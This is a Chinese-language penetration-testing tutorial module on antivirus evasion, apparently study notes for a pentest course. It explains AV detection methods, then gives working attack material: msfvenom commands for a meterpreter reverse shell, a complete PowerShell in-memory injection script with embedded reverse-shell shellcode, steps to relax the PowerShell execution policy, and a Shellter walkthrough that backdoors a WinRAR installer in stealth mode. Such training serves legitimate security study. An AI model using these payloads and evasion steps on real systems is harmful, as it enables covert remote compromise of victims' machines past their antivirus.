# 15-Antivirus Evasion

在本单元中，我们将讨论防病毒软件的用途，并概述它在大多数公司中的部署方式。我们将检查用于检测恶意软件的各种方法，并探索一些可用的工具，这些工具将允许我们绕过目标计算机上的防病毒软件。

## 什么是杀毒软件

防病毒（AV）是一种旨在防止、检测和删除恶意软件的应用程序。它最初的设计目的是简单地删除计算机病毒。然而，随着其他类型恶意软件的发展，杀毒软件现在通常包括额外的保护，如防火墙、网站扫描仪等。

## 检测恶意代码的方法

为了证明各种杀毒产品的有效性，我们将从扫描一个流行的MeterMeter有效负载开始。使用msfvenom，我们将生成一个包含有效负载的标准可移植可执行文件，在本例中是一个简单的TCP反向shell。

可移植可执行文件（PE）文件格式在Windows操作系统上用于可执行文件和目标文件。PE格式表示一种Windows数据结构，它详细说明了windowsloader406管理包装好的可执行代码所需的信息，包括所需的动态库、API导入和导出表等。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.4 LPORT=4444 -f exe > binary.exe
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606271551541-d8658f92-f3ed-47f5-be0b-cd71a3a75a41.png)

接下来，我们将对这个可执行文件运行病毒扫描。我们不需要在本地机器上安装大量的防病毒应用程序，而是可以将我们的文件上传到VirusTotal，它将扫描它以确定各种AV产品的检测率。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606271703131-ec02d83e-d44f-44ca-bf01-6ac78848e614.png)

几乎所有的杀毒软件厂商都可以检测出来，接下来我们了解一下杀毒软件的检测技术。

### 基于特征的检测

防病毒签名是恶意软件中唯一标识它的连续字节序列。基于特征码的防病毒检测大多被认为是黑名单技术。换言之，文件系统被扫描为已知的恶意软件签名，如果检测到任何恶意软件签名，则会隔离有问题的文件。这意味着，有了正确的工具，我们可以很容易地绕过依赖于这种检测方法的杀毒软件。具体地说，我们可以通过简单地更改或混淆已知恶意文件的内容来绕过基于签名的检测，从而破坏标识字节序列（或签名）。

根据测试的防病毒软件的类型和质量，有时我们可以通过简单地将二进制文件中的几个无害字符串从大写改为小写来绕过防病毒软件。然而，并非每一个案例都如此简单。

由于反病毒软件供应商使用不同的特征码和专有技术来检测恶意软件，而且每个供应商都在不断更新他们的数据库，因此通常很难想出一个全面的防病毒规避解决方案。通常，此过程基于测试环境中的试错方法。

因此，在渗透测试期间，在考虑绕过策略之前，我们应该确定部署的防病毒软件的存在、类型和版本。如果客户端网络或系统实施了防病毒软件，我们应该收集尽可能多的信息，并在实验室环境中复制配置，以便在将文件上载到目标计算机之前进行AV旁路测试。

### 启发式和行为检测

为了解决基于特征码检测的缺陷，反病毒制造商引入了额外的检测方法，以提高产品的有效性。

基于启发式的检测是依赖于各种规则和算法来确定动作是否被视为恶意的检测方法。这通常是通过单步执行二进制文件的指令集或尝试反编译然后分析源代码来实现的。其目的是寻找被认为是恶意的各种模式和程序调用（与简单的字节序列相反）。

或者，基于行为的检测动态地分析二进制文件的行为。这通常是通过在模拟环境（如小型虚拟机）中执行相关文件并查找被认为是恶意的行为或操作来实现的。

由于这些技术不需要恶意软件签名，因此可以更有效地识别未知恶意软件或已知恶意软件的变体。考虑到反病毒制造商在启发式和行为检测方面使用不同的实现，每个防病毒产品在被认为是恶意的代码方面会有所不同。

值得注意的是，大多数杀毒软件开发人员使用这些检测方法的组合来实现更高的检测率。

## 绕过防病毒检测

一般来说，防病毒规避分为两大类：磁盘上的和内存中的。Ondisk Evaluation专注于修改物理存储在磁盘上的恶意文件，以逃避AV检测。鉴于AV文件扫描技术的成熟，现代恶意软件往往试图在内存操作中，完全避开磁盘，从而降低被检测到的可能性。在下面的部分中，我们将对这两种方法中使用的一些技术进行非常全面的概述。请注意，有关这些技术的详细信息不在本模块的范围之内。

### On-Disk Evasion

为了开始我们对规避的讨论，我们将首先了解用于混淆存储在物理磁盘上的文件的各种技术。

#### Packers

现代磁盘上的恶意软件混淆可以采取多种形式。最早的避免探测的方法之一是使用封隔器。在互联网早期，由于磁盘空间成本高、网络速度慢，打包机最初的设计目的是简单地减小可执行文件的大小。与现代的“zip”压缩技术不同，打包程序生成的可执行文件不仅更小，而且在功能上与全新的二进制结构等效。结果文件有一个新的签名，因此，可以有效地绕过旧的和更简单的AV扫描仪。尽管一些现代恶意软件使用了这种技术的变体，但仅使用UPX 和其他流行的打包软件并不足以规避现代AV扫描器。

#### Obfuscators

混淆器以一种使反向工程更加困难的方式重组和变异代码。这包括用语义等价的指令替换指令、插入无关指令或“死代码”拆分或重新排序函数，等等。虽然主要是由软件开发人员用来保护他们的知识产权，但这种技术对于基于特征的AV检测也有一定的效果。

#### Crypters

“Crypter”软件以加密方式更改可执行代码，添加一个解密存根，在执行时还原原始代码。这种解密发生在内存中，只在磁盘上留下加密的代码。加密作为最有效的AV规避技术之一，已经成为现代恶意软件的基础。

#### Software Protectors

高效的防病毒规避除了需要其他先进的技术外，还需要将所有先前的技术结合起来，包括反反转、反调试、虚拟机仿真检测等。在大多数情况下，软件保护器是为合法目的而设计的，但也可以用来绕过AV检测。

这些技术中的大多数在高级上看起来很简单，但实际上它们非常复杂。因此，目前很少有主动维护的免费工具提供可接受的工具防病毒规避。在商用工具中，Enigma Protector尤其可以成功地绕过防病毒产品。

### In-Memory Evasion

内存注入，也称为PE注入，是一种流行的技术，用于绕过防病毒产品。与混淆恶意二进制文件、创建新节或更改现有权限不同，此技术将重点放在易失性内存的操作上。这种技术的主要优点之一是它不会将任何文件写入磁盘，这是大多数防病毒产品关注的主要领域之一。

有几种不将文件写入磁盘的规避技术。虽然我们将提供一些简短的解释，在这个模块中，我们只会使用PowerShell来代替内存注入，因为其他依赖于C++（C/C++）等语言的低级编程背景，并且超出了该模块的范围。

#### 远程进程内存注入

此技术尝试将有效负载注入另一个非恶意的有效PE中。最常见的方法是利用一组Windows api。首先，我们将使用OpenProcess函数来获取目标进程的有效句柄，我们有权访问该进程。在获得句柄之后，我们将通过调用一个windowsapi（如VirtualAllocEx）在该进程的上下文中分配内存。一旦在远程进程中分配了内存，我们将使用WriteProcessMemory将恶意负载复制到新分配的内存中。在有效载荷被成功复制后，它通常在内存中使用CreateRemoteThread API在一个单独的线程中执行。

这听起来很复杂，但我们将在下面的示例中使用类似的技术，使用PowerShell来完成大部分繁重的工作，并执行一个非常类似但简化了的针对本地的攻击powershell.exe实例。

#### 反射DLL注入

与常规DLL注入不同，后者意味着使用LoadLibrary API从磁盘加载恶意DLL，此技术尝试加载攻击者存储在进程内存中的DLL。

实现此技术的主要挑战是LoadLibrary不支持从内存加载DLL。此外，Windows操作系统也不公开任何可以处理此问题的api。选择使用此技术的攻击者必须编写自己的API版本，该版本不依赖基于磁盘的DLL。

#### Process Hollowing

当使用process hollowing绕过防病毒软件时，攻击者首先启动处于挂起状态的非恶意进程。启动后，进程的映像将从内存中删除并替换为恶意的可执行映像。最后，恢复进程并执行恶意代码，而不是合法进程。

#### Inline hooking

顾名思义，这种技术包括修改内存并在函数中引入一个钩子（重定向代码执行的指令），以将执行流指向恶意代码。在执行恶意代码时，流将返回修改后的函数并继续执行，看起来好像只有原始代码执行过一样。

### AV逃避：实例

现在我们已经对反病毒软件中使用的检测技术和相关的绕过方法有了一个大致的了解，我们可以将重点转向一个实际的例子。

找到一个通用的解决方案来绕过所有的防病毒产品是困难和耗时的。考虑到典型渗透测试期间的时间限制，针对部署在客户端网络中的特定防病毒产品更有效。

在本模块中，我们将在Windows 10客户端上安装Avira免费防病毒软件15.0.34.16。自己可以在网上搜索一下，很容易就能找到，然后安装启动一下就可以了。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606273386014-753a5ba5-bd74-4e21-a0c9-5d5196645e10.png)

然后我们把在kali上生成的恶意文件传送到win10上面运行一下，看一下杀毒软件的效果，我刚从kali上下载下来，就被检测到了，运行也是会被阻止。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606273724501-cdbbcda9-0c9b-4782-b889-eadfcc9a0bf4.png)

#### PowerShell内存注入

根据我们的目标环境以及它的限制程度，我们可以借助PowerShell绕过防病毒产品

在下面的示例中，我们将使用与远程进程内存注入部分中描述的类似的技术。主要区别在于，我们将针对当前正在执行的进程，在我们的例子中，它将是PowerShell解释器。

PowerShell的一个非常强大的特性是它能够与windowsapi交互。这允许我们在PowerShell脚本中实现内存注入过程。执行脚本而不是PE的一个主要好处是，反病毒制造商很难确定脚本是否恶意，因为它是在解释器中运行的，而且脚本本身不是可执行代码。不过，请记住，有些AV产品比其他产品更好，处理恶意脚本检测更成功。

此外，即使脚本被标记为恶意的，它也很容易被修改。防病毒软件通常会查看变量名、注释和逻辑，所有这些都可以在不需要重新编译的情况下进行更改。

在下面的代码中，我们看到一个执行内存注入的基本模板脚本：

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat ionType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

脚本首先从kernel32.dll导入VirtualAlloc和CreateThread，然后从msvcrt.dll中导入memset. 这些函数将允许我们分配内存，创建一个执行线程，并分别向分配的内存写入任意数据。再次注意，我们正在分配内存并在当前进程（powershell.exe）中执行一个新线程。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606286266969-a731360c-7734-4682-8213-56bdae0f10dc.png)

然后，脚本使用VirtualAlloc分配内存块，获取存储在$sc 字节数组中的有效负载的每个字节，并使用memset将其写入新分配的内存块：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606286298320-5b8695d4-f28d-4cdb-ac23-4c3a083cf688.png)

最后一步，使用CreateThread在单独的线程中执行内存中写入的有效负载。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606286318877-fb7d5459-8f72-46cf-96e5-6076e66d8697.png)

脚本中缺少我们选择的有效负载，它可以使用msfvenom生成。为了保持一致性，我们将保持有效载荷与先前测试中使用的负载相同：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.4 LPORT=4444 -f powershell
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606286480753-ba52c188-4c3e-416e-91bd-430dc43065fe.png)

根据脚本的要求，从msfvenom生成的$buf变量重命名为$sc后，可以将结果输出复制到最终脚本中。我们的完整脚本如下所示：

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat ionType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0xa,0xd3,0x37,0x4,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x67,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xf,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

把上面的代码保存成一个.ps1的脚本文件，然后上传到VirusTotal，发现识别率下降了很多：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606287024371-5950945d-dce6-4f41-b532-8c5ea0a8725a.png)

杀毒软件扫描，也没有报毒：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606287073729-dfbc06d5-5665-46bb-bbe9-b7c13761dfa9.png)

在运行脚本的时候可能出现下面的错误提示：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606287375924-299cb812-4801-4c3f-aca6-c914f8a22e99.png)

让我们尝试查看和更改当前用户的策略。请注意，在这个实例中，我们选择了更改策略，而不是在每个脚本的基础上绕过它，这可以通过在每个脚本运行时使用-ExecutionPolicy Bypass标志来实现。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606287428060-f1d710e0-e630-4ec1-bd7b-93ab24d86928.png)

上面的列表显示我们已经成功地将当前用户的策略更改为Unrestricted。在执行脚本之前，我们将在Kali攻击者机器上启动meterMeter处理程序，以便与shell交互：

```
msfconsole -q
search muti/handler
```

然后用use 编号使用模块

`show options` 查看需要设置的内容

`exploit` 运行

之后就是在win10上运行脚本，但是实际操作中脚本运行会报错，一些定义异常之类的，查找了一番也没有得出答案，暂时搁置。

#### Shellter

Shellter 是一个动态外壳代码注入工具，也是最流行的免费工具之一，能够绕过防病毒软件。它使用了许多新颖和先进的技术，本质上是用恶意外壳代码有效负载来后门一个有效的、非恶意的可执行文件。

虽然Shellter使用的技术的详细信息超出了本模块的范围，但它实际上对目标PE文件和执行路径执行了彻底的分析。然后，它决定在哪里可以注入我们的shellcode，而不依赖传统的注入技术，这些技术很容易被AV引擎捕捉到。其中包括更改PE文件节权限、创建新节，等等。

最后，Shellter尝试使用现有的PE Import Address Table（IAT）条目来定位将用于内存分配、传输和有效负载执行的函数。

有了一点理论，让我们尝试绕过我们目前的反病毒软件使用Shellter。我们可以使用apt在kali安装Shellter：

```
sudo apt install shellter
```

由于Shellter被设计为在Windows操作系统上运行，我们还将安装wine，这是一个兼容层，能够在多个兼容POSIX的操作系统上运行win32应用程序。如果看过前两章的话，这个wine应该都已经没问题了。

直接输入 `shellter` 命令运行即可：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606289609370-08825159-0b38-4ce5-b6e6-147e7c140bfb.png)

Shellter可以在自动或手动模式下运行。在手动模式下，该工具将启动我们要用于注入的PE，并允许我们在更细粒度的级别上操作它。我们可以使用此模式高度定制注入过程，以防自动选择的选项失败。

但是，在这个例子中，我们将在自动模式下运行shell，方法是在提示符处选择“A”。

接下来，我们必须选择一个目标PE。Shelter将分析并更改执行流，以注入和执行我们的有效负载。对于本例，我们将使用流行的WinRAR实用程序的32位试用可执行安装程序作为我们的目标PE。

在以任何方式分析和更改原始PE之前，Shellter将首先创建文件的备份：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606290584416-a5a7eec5-ea62-475e-b957-bcfe0be441bb.png)

一旦Shelleter找到一个合适的地方注入我们的有效载荷，它会询问我们是否要启用隐形模式，将尝试在我们的有效载荷被执行后恢复PE的执行流。我们将选择启用隐形模式，因为我们希望WinRAR安装程序正常运行，以避免任何怀疑。

此时，我们将看到可用有效载荷的列表。其中包括流行的选择，如meterMeter，但Shellter也支持自定义有效载荷。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606290637367-f068c395-11eb-44de-a497-27525fdcec19.png)

注意，为了通过隐形模式选项恢复执行流，自定义有效载荷需要通过退出当前线程终止。

鉴于Avira检测到我们先前生成的MeterMeter PE，我们将使用相同的有效负载设置来测试Sheller Bypass功能。选择有效负载后，我们将看到Metasploit中的默认选项，例如反向shell主机（LHOST）和端口（LPORT）：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606291887928-17f9e547-4f12-428f-9a70-06c89d7b9f43.png)

设置好所有参数后，Shellter将把有效负载注入WinRAR安装程序，并尝试到达有效负载的第一条指令。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606291486925-0b5b9529-f023-4c7c-be74-896ee389b889.png)

既然测试成功了，在将恶意PE文件传输到Windows客户机之前，我们将在Kali机器上配置一个侦听器，以便与meterpeter有效负载交互。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606291513235-b745ca94-42ea-4b4a-97a7-a6fd7a7e586d.png)

理想状态下，文件在win10会是无毒的：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606292254263-b1ede66f-d4c7-42ca-9a93-748a4cd67244.png?x-oss-process=image%2Fresize%2Cw_1500)

一旦我们执行了这个文件，我们将看到默认的WinRAR安装窗口，它将正常安装软件而不会出现任何问题。回顾我们的处理程序，我们成功地接收到一个MeterMeter会话，但在安装完成或被取消后，该会话似乎会终止：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606292465627-5c247d75-67dc-4d85-9376-9d5e6719cbc2.png)

这是有意义的，因为安装程序执行已完成，进程已终止。为了克服这个问题，我们可以设置一个AutoRunScript，在会话创建后立即将meterMeter迁移到一个单独的进程中。如果在对侦听器实例进行此更改后重新运行WinRAR安装文件，则会收到不同的结果。

```
set AutoRunScript post/windows/manage/migrate
exploit
```